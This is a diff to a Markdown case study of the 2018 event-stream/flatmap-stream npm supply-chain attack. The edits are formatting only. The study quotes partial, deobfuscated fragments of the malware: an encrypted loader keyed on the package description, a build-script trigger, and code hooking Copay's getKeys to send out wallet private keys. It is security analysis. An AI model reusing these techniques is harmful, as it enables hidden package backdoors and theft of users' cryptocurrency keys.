@@ -77,16 +77,16 @@ events (§[2.2](#timeline)).
 
 ## Attack Overview
 
-Sometime around early to mid September of 2018, \@right9ctrl [^1]
+Sometime around early to mid September of 2018, @right9ctrl [^1]
 offered to take over maintenance duties on the `event-stream`
 package. Package `event-stream` maintainer
 @[dominictarr](https://github.com/dominictarr) accepted, making
-\@right9ctrl the maintainer of the package. Then, \@right9ctrl
+@right9ctrl the maintainer of the package. Then, @right9ctrl
 introduced flatmap functionality by adding the
 `flatmap-stream` dependency to
 `event-stream`. The `flatmap-stream` package supports a
 flatmap function in addition to the regular `map` already supported
-by `event-stream`. User \@right9ctrl did not specify an exact
+by `event-stream`. User @right9ctrl did not specify an exact
 version of `flatmap-stream`, but rather a range
 of possible versions, with `^0.1.0`. Shortly after,
 `flatmap-stream` version 0.1.1, was released and was within the
@@ -133,19 +133,19 @@ against the `event-stream` GitHub repository, questioning whether
 flatmap functionality would be welcomed, to which the package
 maintainer, @[dominictarr](https://github.com/dominictarr), replied
 positively. This information was presumably later discovered by
-malicious user \@right9ctrl. That user, approached
+malicious user @right9ctrl. That user, approached
 @[dominictarr](https://github.com/dominictarr), between August 5 and
-September 4 of 2018. User \@right9ctrl offered assistance to the package
+September 4 of 2018. User @right9ctrl offered assistance to the package
 maintenance and proposed to make the necessary changes to introduce
 flatmap functionality. This introduction would be achieved by adding the
 `flatmap-stream` package as a new dependency. User
 @[dominictarr](https://github.com/dominictarr) accepted this offer,
-making \@right9ctrl a contributor to the `event-stream` Github
+making @right9ctrl a contributor to the `event-stream` Github
 repository and giving them full publishing rights for the module on the
 NPM ecosystem. In order to publish on the NPM ecosystem you need to be
 given publishing rights by the package maintainer.
 
-**Benign Commits Phase:** Soon after, \@right9ctrl pushed a series of
+**Benign Commits Phase:** Soon after, @right9ctrl pushed a series of
 benign commits to the `event-stream` GitHub repository, potentially
 to gain @[dominictarr](https://github.com/dominictarr) trust. Here is a
 list of those commits:
@@ -170,7 +170,7 @@ list of those commits:
 
 **Introducing flatmap-stream:** On September 9, 2018 the following
 commit was pushed to the `event-stream` GitHub repository by user
-\@right9ctrl:
+@right9ctrl:
 
 -   [2b8285](https://github.com/dominictarr/event-stream/commit/e3163361fed01384c986b9b4c18feb1fc42b8285):
     (Add flatmap dependency)
@@ -232,7 +232,7 @@ Payload A acts as the bootstrapper for the rest of the Payloads and was
 appended to the `flatmap-stream` codebase in version 0.1.1. The
 payload consists of the following code:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
+```javascript
 ! function() {
  try {
   var r = require,
@@ -257,7 +257,7 @@ This code is unreadable, as it is still obfuscated. Let us walk through
 it line by line, deobfuscating and analyzing it. Function `e`
 converts a hexadecimal string to text. It is first used in line 8:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
+```javascript
 var n = r(e("2e2f746573742f64617461"));
 ```
 
@@ -265,7 +265,7 @@ The hexadecimal string is equivalent to `./test/data`{.js}, and function
 `r`{.js} is the function `require`{.js}. So, after renaming `n`{.js} to
 `testData`{.js}, line 8 becomes as follows:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
+```javascript
 var testData = require("./test/data");
 ```
 
@@ -275,7 +275,7 @@ representation. Multiple of these strings are related to cryptography
 and would raise suspicion should anyone see them in a module such as
 `flatmap-stream`. Here are the contents of the data file:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
+```javascript
 module.exports = [
  "75d4c...629", // Payload B
  "db673...6e1", // Payload C
@@ -293,7 +293,7 @@ module.exports = [
 Line 9 extracts the fourth and fifth string from the data file. Variable
 `o` has been renamed to `desc` for readability:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\small"}
+```javascript
 var desc = process.env.npm_package_description;
 ```
 
@@ -307,7 +307,7 @@ to deobfuscate the rest of the function. Moreover, we rename variable
 `u` to `decipher`, `a` to `text`, and `f` to
 `newModule`. By doing so, we get:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
+```javascript
 var decipher = require("crypto").
 createDecipher("aes256", desc);
 var text = decipher.update(testData[0], "hex", "utf8");
@@ -346,7 +346,7 @@ After successful decryption of the first line of the data file from
 payload A, payload B is created as a new module. Payload B acts as the
 injector. This new unobfuscated module looks as follows:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
+```javascript
 /*@@*/
 module.exports = function(e) {
  try {
@@ -376,14 +376,14 @@ module.exports = function(e) {
 
 We start with line 4:
 
-``` {.js fontsize="\\normalsize"}
+```javascript
 if (!/build\:.*\-release/.test(process.argv[2])) 
  return;
 ```
 
 The script is executed by a command in this format:
 
-``` {.shell fontsize="\\small"}
+```javascript
 npm run-script script-name
 ```
 
@@ -447,7 +447,7 @@ The order of execution is as follows:
 
 The injected code proceeds with the following process:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
+```javascript
 var Cred = require("wallet-client/lib/credentials.js");
 Cred.prototype.getKeysFunc = e.prototype.getKeys;
 Cred.prototype.getKeys = function(e) {
@@ -475,7 +475,7 @@ any remaining traces and transmits the user's Copay private keys using
 the `prepRequest` function. The script is launched as soon as the
 user's device is ready, using the following code segment:
 
-``` {.js xleftmargin="\\parindent" linenos="" fontsize="\\normalsize"}
+```javascript
 window.cordova ? 
  document.addEventListener("deviceready", 
   runPayload) : runPayload()
@@ -659,7 +659,7 @@ developer effort. Conventional program analysis techniques would have
 likely missed the attack, and manual vetting proved to be inadequate for
 the scale and complexity of dependencies used in modern applications.
 
-[^1]: User's \@right9ctrl GitHub account is now deleted.
+[^1]: User's @right9ctrl GitHub account is now deleted.
 
 [^2]: Minification is the process of removing comments, non-essential
     whitespace, and replacing long identifiers from source code to
